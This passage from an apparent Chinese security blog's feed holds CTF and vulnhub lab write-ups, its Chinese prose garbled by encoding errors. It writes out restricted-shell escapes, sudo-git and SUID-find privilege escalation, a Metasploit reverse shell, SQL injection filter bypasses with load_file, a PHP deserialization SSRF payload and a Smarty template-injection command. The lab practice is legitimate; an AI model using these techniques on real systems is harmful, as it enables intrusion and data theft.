class="line">BASH_CMDS[A]=/bin/sh;A //è¿›å…¥shç¯å¢ƒ</span><br><span class="line">/bin/bash  //æ¥åˆ°bashç¯å¢ƒ</span><br><span class="line">export PATH=$PATH:/bin/</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409213553364.png" alt="image-20230409213553364"></p><p>æˆåŠŸç»•è¿‡</p><p><strong>ç„¶åæˆ‘ä»¬su jerry ï¼Œæ¥åˆ°jerryç”¨æˆ·ï¼Œcdæ¥åˆ°é»˜è®¤ç›®å½•å°±å¯ä»¥çœ‹åˆ°flag4.txt</strong></p><p><img src="../images/image-20230409213728621.png" alt="image-20230409213728621"></p><p>çœ‹åˆ°flag4.txtçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å¾ˆé«˜å…´çœ‹åˆ°ä½ å·²ç»èµ°åˆ°è¿™ä¸€æ­¥ - ä½†ä½ è¿˜æ²¡æœ‰åˆ°å®¶ã€‚</span><br><span class="line"></span><br><span class="line">æ‚¨ä»ç„¶éœ€è¦è·å¾—æœ€ç»ˆæ ‡å¿—ï¼ˆå”¯ä¸€çœŸæ­£é‡è¦çš„æ ‡å¿—ï¼ï¼ï¼ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæ²¡æœ‰æç¤º - ä½ ç°åœ¨é è‡ªå·±äº†ã€‚ :-)</span><br><span class="line"></span><br><span class="line">ç»§ç»­ - ç¦»å¼€è¿™é‡Œï¼ï¼ï¼ï¼</span><br></pre></td></tr></table></figure><p>çŒœæµ‹å°±æ˜¯ææƒäº†</p><p>å› ä¸ºè¿™é‡Œå¹¶ä¸æ˜¯rootç”¨æˆ·</p><p>è¿˜æ˜¯ç”¨findå‘½ä»¤å°è¯•ä¸€ä¸‹(suid)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409214009428.png" alt="image-20230409214009428"></p><p>æœ‰ä¸ªsudoå¯ä»¥ç”¨  é‚£ä¹ˆå°±çŒœæµ‹è¿™é‡Œæ˜¯ç”¨sudoææƒ</p><p>é‚£ä¹ˆå°±ã€<code>sudo -l</code>ä¸€ä¸‹,çœ‹è°æœ‰rootæƒé™</p><p><img src="../images/image-20230409214118195.png" alt="image-20230409214118195"></p><p>å‘ç°æ˜¯gitï¼Œè¿˜æ²¡æœ‰å¯†ç é™åˆ¶</p><p><img src="../images/image-20230409214149805.png" alt="image-20230409214149805"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line"></span><br><span class="line">ç„¶åç›´æ¥è¾“å…¥!/bin/bash</span><br><span class="line"></span><br><span class="line">ç„¶åæˆ‘ä»¬å°±æ˜¯rootäº†ï¼Œåœ¨ç„¶åå°±æ˜¯è·å¾—flagäº†</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409214323234.png" alt="image-20230409214323234"></p><p>ç„¶åå°±æ˜¯rootç”¨æˆ·äº†</p><p>æ¥ä¸‹æ¥ç›´æ¥è¯»å–flagå°±è¡Œäº†</p><p><img src="../images/image-20230409214511930.png" alt="image-20230409214511930"><strong>wpscanè¿™ä¸ªå·¥å…·æ„Ÿè§‰æ˜¯ä¸ºäº†wordpressè€Œå‡†å¤‡çš„</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC1</title>
      <link href="/posts/bd435367.html"/>
      <url>/posts/bd435367.html</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œçœ‹ä¸€ä¸‹å“ªä¸ªæ‰æ˜¯é¶æœº</p><p><img src="../images/image-20230409181402738.png" alt="image-20230409181402738"></p><p>ç„¶åå°±éšä¾¿çŒœä¸€ä¸ªï¼Œï¼ˆæˆ–è€…å…³æ‰é¶æœºï¼Œåœ¨é‡æ–°æ‰«ä¸€éçœ‹å“ªä¸ªæ²¡äº†å“ªä¸ªå°±æ˜¯é¶æœºï¼‰</p><p>è¿™é‡Œçš„è¯128æ˜¯é¶æœº</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰«ç«¯å£äº†</p><p><img src="../images/image-20230409181552407.png" alt="image-20230409181552407"></p><p>æ‰«åˆ°äº†ä¸‰ä¸ªç«¯å£</p><p>80ç«¯å£ä¸€çœ‹å°±æ˜¯ä¸ªç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹çœ‹èƒ½ä¸èƒ½ç›´æ¥æ— å¯†ç (æˆ–è€…å¼±å¯†ç )ç™»å½•ssh</p><p><img src="../images/image-20230409181755763.png" alt="image-20230409181755763"></p><p>å°è¯•å¤±è´¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹å»æŸ¥çœ‹ä¸€ä¸‹80ç«¯å£</p><p><img src="../images/image-20230409181842624.png" alt="image-20230409181842624"></p><p>å‘ç°æ˜¯ä¸€ä¸ªcmsæ¡†æ¶ï¼Œç‰ˆæœ¬æ˜¯7.xï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å»æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰è¿™ä¸ªæ¡†æ¶çš„expèƒ½ç›´æ¥æ¥æ‰“</p><p><strong>åœ¨msfä¸­æœç´¢ä¸€ä¸‹</strong></p><p><img src="../images/image-20230409182322318.png" alt="image-20230409182322318"></p><p>å‘ç°æœ‰è¿™ä¸ªæ¡†æ¶çš„exp  å’Œaux(è¿™ä¸ªæ˜¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´)</p><p>é‚£æˆ‘ä»¬å°±ç›´æ¥ä½¿ç”¨ç›´æ¥ä½¿ç”¨è¿™ä¸ªexpæ¥æ‰“è¿™ä¸ªç½‘ç«™äº†ï¼Œç”¨çš„æ˜¯ç¬¬äºŒä¸ª</p><p><img src="../images/image-20230409183330747.png" alt="image-20230409183330747"></p><p>è®¾ç½®é¶æœºåœ°å€</p><p><strong>set rhosts xxxxxxxxxx</strong></p><p><img src="../images/image-20230409183407891.png" alt="image-20230409183407891"></p><p>è®¾ç½®æˆåŠŸ   (åé¢æ˜¯yesçš„ï¼Œå‰é¢çš„å†…å®¹å¿…é¡»å¾—å†™ä¸Š)</p><p><img src="../images/image-20230409183548884.png" alt="image-20230409183548884"></p><p>åå¼¹shellæˆåŠŸ  æ‹¿åˆ°äº†<strong>meterpreter</strong></p><p><img src="../images/image-20230409183643295.png" alt="image-20230409183643295"></p><p>è¯»å–flag1çš„æ—¶å€™ç»™äº†ä¸€æ®µè¯     å°±æ˜¯configé…ç½®æ–‡ä»¶</p><p><img src="../images/image-20230409183738020.png" alt="image-20230409183738020"></p><p>è®¿é—®é…ç½®æ–‡ä»¶æ‹¿åˆ°å…³é”®æ•°æ®</p><p><img src="../images/image-20230409183955691.png" alt="image-20230409183955691"></p><p><img src="../images/image-20230409183912269.png" alt="image-20230409183912269"></p><p>è¿™é‡Œæ•°æ®åº“ç™»å½•æŠ¥é”™ï¼Œå°±ä¸ç™»é™†äº†ï¼Œç›´æ¥è¿›è¡Œææƒæ‹¿æœ€ç»ˆçš„flagå°±è¡Œ</p><p><img src="../images/image-20230409190252841.png" alt="image-20230409190252841"></p><p>è¿™é‡Œçš„è¯å…ˆå°è¯•ä¸€ä¸‹suid   è¿™é‡Œè¯åœ¨htbé‡Œé¢åšè¿‡ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†</p><p>è¿™é‡Œå¦‚æœæŒ‰é¡ºåºæ‹¿flagçš„è¯ä¼šæç¤ºç”¨suid</p><p>è¿™é‡Œè¯å¼„ä¸ªäº¤äº’shellå¥½è¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>\;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409190621996.png" alt="image-20230409190621996"></p><p><img src="../images/image-20230409190655243.png" alt="image-20230409190655243"></p><p>ææƒçš„è¯å¯ä»¥ç›´æ¥æ‹¿åˆ°æœ€ç»ˆçš„flag</p><p>äºæ˜¯å°±æ˜¯è¿›è¡Œsuidææƒ</p><p>å…ˆæŸ¥æ‰¾ä¸€ä¸‹è°å…·æœ‰sæƒé™</p><p><img src="../images/image-20230409190830425.png" alt="image-20230409190830425"></p><p>æ‰¾åˆ°äº†ä¸ªfindå‘½ä»¤å¯ä»¥ä½¿ç”¨</p><p>äºæ˜¯è¿›è¡Œfindææƒ</p><p><img src="../images/image-20230409191336590.png" alt="image-20230409191336590"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./ -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find  åœ¨å“ªæ‰§è¡Œ -exec &quot;ä»£ç æ‰§è¡Œ&quot; \</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-åˆ·é¢˜è®°å½• ç¬¬äºŒé¡µ</title>
      <link href="/posts/6446e84f.html"/>
      <url>/posts/6446e84f.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230406145253672.png" alt="image-20230406145253672"></p><p>è®¿é—®robots.txtå¾—åˆ°ä¸‹é¢å†…å®¹</p><p><img src="../images/image-20230406145322985.png" alt="image-20230406145322985"></p><p>è®¿é—®ä¸‹è½½ä¸‹æ¥å¾—åˆ°ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406145503826.png" alt="image-20230406145503826"></p><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªssrf</p><p>å°±æ˜¯curl_execä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´ssrfï¼Œç„¶åæˆ‘ä»¬å›åˆ°é¦–é¡µï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç‚¹è¿›å»åï¼Œå‘ç°æœ‰ä¸€ä¸ªç±»ä¼¼sqlæ³¨å…¥çš„ä¸œè¥¿</p><p><img src="../images/image-20230406145655942.png" alt="image-20230406145655942"></p><p>ç„¶åå°±æ€€ç–‘è¿™é‡Œä¼šä¸ä¼šå­˜åœ¨sqlæ³¨å…¥</p><p>äºæ˜¯å°è¯•æ‰‹å·¥æ³¨å…¥ï¼š</p><p>?no = 1 and 1=1ã€€ã€€//å›æ˜¾æ­£å¸¸</p><p>?no = 1 and 1=2ã€€ã€€//é”™è¯¯å›æ˜¾</p><p>é“å®šæ•°å­—å‹æ³¨å…¥ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹çœ‹è¡¨ä¸­æœ‰å¤šå°‘åˆ—ï¼Œç¡®å®šä¸€ä¸‹åˆ—æ•°ï¼Œ</p><p>?no = 1 order by 3ã€€ã€€ã€€ã€€//æ­£å¸¸</p><p>?no = 1 order by 4ã€€ã€€ã€€ã€€//æ­£å¸¸</p><p>?no = 1 order by 5ã€€ã€€ã€€ã€€//é”™è¯¯</p><p>æ‰€ä»¥ç¡®å®šåˆ—æ•°ï¼Œæœ‰4åˆ—</p><p>äºæ˜¯æˆ‘ä»¬å°è¯•unionè”åˆæ³¨å…¥ï¼š</p><p>?no = -1 union select 1,2,3,4â€”+</p><p><a href="https://img2020.cnblogs.com/blog/2075370/202012/2075370-20201208171409279-1904431169.png"><img src="https://img2020.cnblogs.com/blog/2075370/202012/2075370-20201208171409279-1904431169.png" alt="img"></a></p><p> ç»“æœæœ‰è¿™ä¹ˆä¸€æ®µè¯ï¼Œè¢«å‘ç°äº†ã€‚</p><p>ç„¶åï¼Œé€šè¿‡å¤§ä½¬wpä¸­å‘ç°ï¼Œè¿‡æ»¤äº†union select     (è¿™é‡Œè¿‡æ»¤çš„ä¸æ˜¯å•ä¸ªï¼Œè€Œæ˜¯æ•´ä¸ªè¿›è¡Œäº†è¿‡æ»¤)æ‰€ä»¥å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼è¿›è¡Œç»•è¿‡</p><p>å¯ä»¥ç”¨è¿‡union/**/selectç»•è¿‡</p><p>äºæ˜¯æˆ‘ä»¬å†æ¬¡æ„é€ payload:</p><p>?no = -1 union/**/select 1,2,3,4â€”+</p><p><img src="../images/image-20230406150007353.png" alt="image-20230406150007353"></p><p> å›æ˜¾ä½æ˜¯username,ç„¶åè¿˜å‘ç°äº†ä¸€ä¸‹é”™è¯¯ä¿¡æ¯ï¼Œ/var/www/html/view.phpåˆšæ‰æ‰«ç›®å½•å¾—çŸ¥flag.phpä¹Ÿåœ¨è¿™ä¸ªç›®å½•ä¸­ã€‚</p><p>ç„¶åæˆ‘ä»¬å¼€å§‹æŸ¥æ•°æ®åº“å’Œæ•°æ®åº“ä¿¡æ¯</p><p>?no=-1 union/**/select 1,database(),3,4â€”+ã€€ã€€//æ•°æ®åº“å</p><p><img src="../images/image-20230406150253089.png" alt="image-20230406150253089"></p><p>?no=-1 union/**/select 1,user(),3,4â€”+ã€€ã€€ã€€ã€€//æ•°æ®åº“ä¿¡æ¯</p><p><img src="../images/image-20230406150330888.png" alt="image-20230406150330888"></p><p>æ˜¯rootç”¨æˆ·</p><p>å‘ç°å±…ç„¶æ˜¯rootæƒé™ï¼Œé‚£æˆ‘ä»¬çŸ¥é“æœ‰ä¸€ä¸ªload_file()å‡½æ•°å¯ä»¥åˆ©ç”¨ç»å¯¹è·¯å¾„å»åŠ è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸‹</p><p>load_file(file_name):file_nameæ˜¯ä¸€ä¸ªå®Œæ•´çš„è·¯å¾„ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥ç”¨var/www/html/flag.phpè·¯å¾„å»è®¿é—®ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶</p><p>?no=-1 union/**/select 1,load_file(â€œ/var/www/html/flag.phpâ€),3,4â€”+</p><p><img src="../images/image-20230406150538443.png" alt="image-20230406150538443"></p><p>è¿™æ˜¯éé¢„æœŸè§£</p><p>æ¥ä¸‹æ¥æ˜¯é¢„æœŸè§£</p><p>çˆ†æ•°æ®åº“è¡¨</p><p>?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()â€”+</p><p><img src="../images/image-20230406150702385.png" alt="image-20230406150702385"></p><p> è·å¾—ä¸€å¼ usersè¡¨</p><p>ç„¶åçˆ†å­—æ®µåï¼š</p><p>?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=â€™usersâ€™â€”+</p><p><img src="../images/image-20230406150734818.png" alt="image-20230406150734818"></p><p> è¿™é‡Œé¢noï¼Œusername,passwordæˆ‘ä»¬éƒ½çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œå°±dataæœ‰ç‚¹çŒ«è…»ï¼Œäºæ˜¯æˆ‘ä»¬æŸ¥çœ‹å®ƒä¸€ä¸‹ï¼Œäºæ˜¯æˆ‘ä»¬çˆ†dataå†…å®¹ï¼š</p><p>?no=-1 union/<strong>/select/</strong>/1,group_concat(no,â€™~â€™,username,â€™~â€™,passwd,â€™~â€™,data),3,4/<strong>/from/</strong>/fakebook.users</p><p><img src="../images/image-20230406150941192.png" alt="image-20230406150941192"></p><p>æ˜¯ä¸€ä¸ªåºåˆ—åŒ–åçš„å€¼ï¼Œç„¶åç»“åˆæˆ‘ä»¬ä¸Šé¢è·å¾—åˆ°çš„æºç æ¥è¿›è¡Œåˆ†æ</p><p>å°±æ˜¯å¯ä»¥æ§åˆ¶åšå®¢çš„å€¼æ¥è¿›è¡Œssrf</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¹‹å‰çš„æ³¨å…¥å¯çŸ¥ï¼Œæœ‰å›æ˜¾çš„æ˜¯ç¬¬äºŒä½ï¼Œä¹Ÿå°±æ˜¯<code>username</code>å­—æ®µï¼Œ<code>data</code>å¯¹åº”åº”è¯¥å°±æ˜¯ç¬¬å››ä¸ªå­—æ®µä¸ºï¼Œå°†ååºåˆ—åŒ–å­—ç¬¦ä¸²å°è¯•ä»¥æ³¨å…¥çš„æ–¹å¼å†™å…¥</p><p><img src="../images/image-20230406151427472.png" alt="image-20230406151427472"></p><p>å¯¹ä¸‹é¢çš„ä¸œè¥¿è¿›è¡Œbase64ç¼–ç å°±è¡Œäº†</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><a href="https://blog.csdn.net/qq_42812036/article/details/104280196">è¿™ç¯‡æ–‡ç« è®²äº†æºç æ³„éœ²çš„ä¾‹å­</a></p><p>é¢˜ç›®</p><p><img src="../images/image-20230406151807004.png" alt="image-20230406151807004"></p><p>ç™»å½•æ¡†æ˜¯å¼±å¯†ç </p><p><strong>admin/admin888</strong></p><p><img src="../images/image-20230406152326149.png" alt="image-20230406152326149"></p><p>å‘ç°æ²¡å•¥ä¸œè¥¿ï¼Œç„¶åç‚¹å‡»ä¸‹é¢çš„helpçš„è¯ï¼Œå°±ä¼šå‡ºç°è¿™ä¸ªä¸œè¥¿</p><p><img src="../images/image-20230406152427782.png" alt="image-20230406152427782"></p><p>å¹¶ä¸”å®ƒçš„urlä¹Ÿå¾ˆæœ‰æ„æ€ï¼Œè²Œä¼¼å¯ä»¥ä¸‹è½½æ–‡ä»¶</p><p>å‘ç°getä¸è¡Œ</p><p>è¯•è¯•post</p><p><img src="../images/image-20230406152628037.png" alt="image-20230406152628037"></p><p>å¯è¿›è¡Œæ–‡ä»¶çš„ä¸‹è½½</p><p><img src="../images/image-20230406152653573.png" alt="image-20230406152653573"></p><p>æ‰“å¼€åå•¥ä¹Ÿæ²¡æœ‰ï¼Œå°è¯•å»çœ‹çœ‹ä¼šä¸ä¼šå­˜åœ¨æºç æ³„éœ²</p><p><img src="../images/image-20230406152737617.png" alt="image-20230406152737617"></p><p>å­˜åœ¨æºç æ³„éœ²</p><p><img src="../images/image-20230406152823449.png" alt="image-20230406152823449"></p><p>è¿™åƒæ˜¯æ–‡ä»¶å­˜æ”¾çš„è·¯å¾„</p><p>è¯»å–<code>FlagController.class</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè·¯å¾„çš„è¯å†™è¿‡javaçš„å°±èƒ½æ‡‚äº†</p><p><img src="../images/image-20230406153211962.png" alt="image-20230406153211962"></p><p>ä¸‹è½½æ–‡ä»¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†</p><p><img src="../images/image-20230406153311897.png" alt="image-20230406153311897"></p><p>æŠŠæ–‡ä»¶å†…çš„ç¼–ç è¿›è¡Œbase64è§£ç å°±è¡Œäº†</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230406153757995.png" alt="image-20230406153757995"></p><p>æ‰“å¼€ç•Œé¢ï¼Œè½¬åˆ°flagä¸‹é¢ï¼Œå‘ç°å±•ç¤ºæˆ‘IPçš„ä¸€ä¸ªç•Œé¢ï¼Œçœ‹åˆ°è¿™ä¸ªå°±çªç„¶æƒ³åˆ°äº† X-Forwarded-For  </p><p>X-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µã€‚è¯´ç™½äº†å°±æ˜¯æ£€æµ‹å¤–æ¥æ¥å…¥çš„IPåœ°å€çš„ä¸œè¥¿ï¼Œä¹‹å‰åšé¢˜ç›®çš„æ—¶å€™ç»å¸¸ä¼šé‡åˆ°é™åˆ¶åªèƒ½ç”¨é»˜å†™ç‰¹å®šçš„ipè®¿é—®çš„é¢˜ç›®ï¼ŒæŠ“åŒ…ä¹‹åæ”¹ä»–å°±å¯¹äº†ã€‚</p><p>è¿›å…¥ç¯å¢ƒï¼Œå‘ç°è¿˜æ˜¯é‚£ä¸ªç†Ÿæ‚‰çš„é¡µé¢ï¼Œhinté‡Œç»™æˆ‘ä»¬æç¤ºäº†ipï¼Œåœ¨flag.phpé‚£é‡Œå°è¯•xffå¤´ï¼Œå‘ç°æˆåŠŸå›æ˜¾ï¼Œè¯´æ˜å›æ˜¾çš„ç‚¹åœ¨xffå¤´é‚£é‡Œã€‚çŒœæµ‹æ˜¯SSTIã€‚</p><p><img src="../images/image-20230406155110102.png" alt="image-20230406155110102"></p><p>ç¡®å®æ˜¯æˆåŠŸä¿®æ”¹äº†</p><p><img src="../images/image-20230406155146646.png" alt="image-20230406155146646"></p><p>è¿”å›äº†49ï¼Œè¯´æ˜ä¸æ˜¯jinja2çš„ssti</p><p><img src="../images/image-20230406155308230.png" alt="image-20230406155308230"></p><p>æ‰€ä»¥å°±é€šè¿‡åˆ¤æ–­æ¥ç¡®å®šæ˜¯ä¸Šé¢çš„å“ªç§ç±»å‹</p><p><img src="../images/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATDFhbTB1cg==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p>å°±æ˜¯é€šè¿‡è¿™å¼ å›¾æ¥åˆ¤æ–­sstiçš„ç±»å‹</p><p><img src="../images/image-20230406192122449.png" alt="image-20230406192122449"></p><p>ç”±æ­¤æ¥åˆ¤æ–­æ˜¯smartyçš„sstiæ¨¡æ¿æ³¨å…¥</p><p><a href="https://www.freebuf.com/column/219913.html">smarty  ssti</a></p><p>çŸ¥é“äº†ä¹‹åå°±ç›´æ¥å†™payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span 